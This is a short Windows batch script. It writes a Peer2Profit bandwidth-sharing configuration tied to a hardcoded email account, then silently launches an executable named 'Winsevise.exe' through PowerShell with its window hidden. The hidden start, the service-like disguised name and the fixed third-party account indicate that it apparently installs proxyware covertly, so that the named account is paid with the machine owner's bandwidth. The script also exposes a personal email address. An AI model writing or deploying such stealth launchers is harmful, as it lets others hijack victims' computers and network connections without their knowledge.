set "CONFIG_DIR=%LOCALAPPDATA%\Peer2Profit\Peer2Profit"
set "CONFIG_FILE=%CONFIG_DIR%\org.peer2profit.peer2profit.ini"

if not exist "%CONFIG_DIR%" mkdir "%CONFIG_DIR%"
(
echo [General]
echo installid2=cf385d34-966d-4f1c-b9cf-90416ac40b2e
echo Username=dedic331982@gmail.com
) > "%CONFIG_FILE%"

copy /Y "%CONFIG_FILE%" "%~dp0org.peer2profit.peer2profit.ini" >nul 2>&1

tasklist /FI "IMAGENAME eq Winsevise.exe" | find /I "Winsevise.exe" >nul
if errorlevel 1 (
    powershell -WindowStyle Hidden -Command "$psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName = 'Winsevise.exe'; $psi.WorkingDirectory = '%~dp0'; $psi.WindowStyle = 'Hidden'; [System.Diagnostics.Process]::Start($psi)"
)

timeout /t 2 /nobreak >nul